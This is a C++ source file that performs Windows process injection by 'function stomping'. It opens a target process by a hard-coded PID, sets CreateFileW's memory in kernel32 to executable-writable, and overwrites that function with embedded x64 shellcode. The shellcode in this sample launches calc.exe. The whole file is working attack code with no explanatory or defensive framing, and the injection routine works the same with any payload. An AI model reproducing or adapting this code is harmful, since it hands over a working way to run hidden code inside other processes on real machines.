#include <Windows.h>
#include <iostream>

// shellcode to spawn windows calculator
unsigned const char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";



int main()
{
    DWORD pid = 1824;  // pid of process where to inject the shellcode 

    DWORD oldPermissions;
    HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (procHandle == 0 || procHandle == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Could not get process handle: " << GetLastError() << std::endl;
        return -1;
    }

    std::cout << "[+] Got process handle!" << std::endl;

    // Load the kernel32.dll module
    HMODULE kernel32Module = GetModuleHandleW(L"kernel32.dll");
    if (kernel32Module == NULL) {
        std::cout << "Failed to load kernel32.dll. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    FARPROC functionBase = GetProcAddress(kernel32Module, "CreateFileW");
    if (functionBase == NULL) {
        std::cout << "Failed to get the address of CreateFileW. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    const size_t sizeToWrite = sizeof(shellcode);

    char oldFunction[sizeToWrite]{ 0 };


    if (!ReadProcessMemory(procHandle, functionBase, oldFunction, sizeToWrite, NULL)) {
        std::cerr << "[-] Shellcode is too big!" << std::endl;
        CloseHandle(procHandle);
        return -1;
    }

    // Changing the protection to READWRITE to write the shellcode.
    if (!VirtualProtectEx(procHandle, functionBase, sizeToWrite, PAGE_EXECUTE_READWRITE, &oldPermissions)) {
        std::cerr << "[-] Failed to change protection: " << GetLastError() << std::endl;
        CloseHandle(procHandle);
        return -1;
    }
    std::cout << "[+] Changed protection to RW to write the shellcode." << std::endl;


    SIZE_T written;

    if (!WriteProcessMemory(procHandle, functionBase, shellcode, sizeof(shellcode), &written)) {
        std::cerr << "[-] Failed to overwrite function: " << GetLastError() << std::endl;
        VirtualProtectEx(procHandle, functionBase, sizeToWrite, oldPermissions, &oldPermissions);
        CloseHandle(procHandle);
        return -1;
    }

    std::cout << "[+] Successfuly stomped the function!" << std::endl;


    if (!VirtualProtectEx(procHandle, functionBase, sizeToWrite, PAGE_EXECUTE_WRITECOPY, &oldPermissions)) {
        std::cerr << "[-] Failed to change protection: " << GetLastError() << std::endl;
        CloseHandle(procHandle);
        return -1;
    }

    std::cout << "[+] Changed protection to WCX to run the shellcode!\n[+] Shellcode successfuly injected!" << std::endl;


    CloseHandle(procHandle);


    return 0;
}
